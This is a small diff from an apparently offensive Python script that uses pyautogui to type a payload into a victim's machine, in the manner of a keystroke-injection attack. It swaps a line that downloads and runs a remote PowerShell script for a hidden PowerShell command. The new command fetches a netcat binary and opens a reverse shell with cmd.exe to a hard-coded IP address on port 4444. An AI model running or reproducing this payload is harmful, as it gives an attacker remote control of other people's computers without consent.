@@ -17,6 +17,6 @@ pyautogui.press('enter')
 time.sleep(1)
 
 # Step 4: Type the payload
-payload = 'iwr https://raw.githubusercontent.com/err0rgod/ershell/main/rev.ps1 | iex'
+payload = 'powershell -w Hidden -Command Invoke-WebRequest -Uri https://github.com/err0r-arsenal/netcat/raw/refs/heads/main/ncat.exe -OutFile cat.exe; ./cat.exe 34.131.140.5 4444 -e cmd.exe'
 pyautogui.write(payload, interval=0.05)
 pyautogui.press('enter')
